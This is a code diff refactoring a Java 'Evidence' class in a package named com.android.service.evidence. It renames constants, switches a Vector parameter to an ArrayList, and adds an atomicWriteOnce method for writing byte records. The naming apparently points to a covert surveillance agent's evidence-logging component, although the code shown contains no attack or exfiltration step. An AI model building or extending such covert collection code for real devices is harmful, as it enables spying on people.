@@ -9,6 +9,7 @@
 
 package com.android.service.evidence;
 
+import java.util.ArrayList;
 import java.util.Date;
 import java.util.Vector;
 
@@ -32,10 +33,10 @@ import com.android.service.util.WChar;
 public final class Evidence {
 
 	/** The Constant EVIDENCE_VERSION_01. */
-	private static final int EVIDENCE_VERSION_01 = 2008121901;
+	private static final int E_VERSION_01 = 2008121901;
 
 	/** The EVIDENCE delimiter. */
-	public static int EVIDENCE_DELIMITER = 0xABADC0DE;
+	public static int E_DELIMITER = 0xABADC0DE;
 
 	/** The Constant TAG. */
 	private static final String TAG = "Evidence"; //$NON-NLS-1$
@@ -343,7 +344,7 @@ public final class Evidence {
 		}
 
 		evidenceDescription = new EvidenceDescription();
-		evidenceDescription.version = EVIDENCE_VERSION_01;
+		evidenceDescription.version = E_VERSION_01;
 		evidenceDescription.logType = evidenceType;
 		evidenceDescription.hTimeStamp = datetime.hiDateTime();
 		evidenceDescription.lTimeStamp = datetime.lowDateTime();
@@ -435,22 +436,21 @@ public final class Evidence {
 	 *            the bytelist
 	 * @return true, if successful
 	 */
-	public boolean writeEvidences(final Vector bytelist) {
+	public boolean writeEvidences(final ArrayList<byte[]> byteList) {
 
 		int totalLen = 0;
-		for (int i = 0; i < bytelist.size(); i++) {
-			final byte[] token = (byte[]) bytelist.elementAt(i);
-			totalLen += token.length;
-		}
+		for (byte[] bs : byteList) {
+			totalLen += bs.length;
+		}		
 
 		final int offset = 0;
 		final byte[] buffer = new byte[totalLen];
 		final DataBuffer databuffer = new DataBuffer(buffer, 0, totalLen);
 
-		for (int i = 0; i < bytelist.size(); i++) {
-			final byte[] token = (byte[]) bytelist.elementAt(i);
-			databuffer.write(token);
+		for (byte[] bs : byteList) {
+			databuffer.write(bs);
 		}
+		
 		return writeEvidence(buffer);
 	}
 
@@ -508,6 +508,12 @@ public final class Evidence {
 			close();
 		}
 	}
+	
+	public void atomicWriteOnce(ArrayList<byte[]> byteList) {
+		createEvidence(null);
+        writeEvidences(byteList);
+        close();
+	}
 
 	@Override
 	public String toString() {
@@ -517,4 +523,6 @@ public final class Evidence {
 			return Integer.toString(progressive);
 		}
 	}
+
+
 }
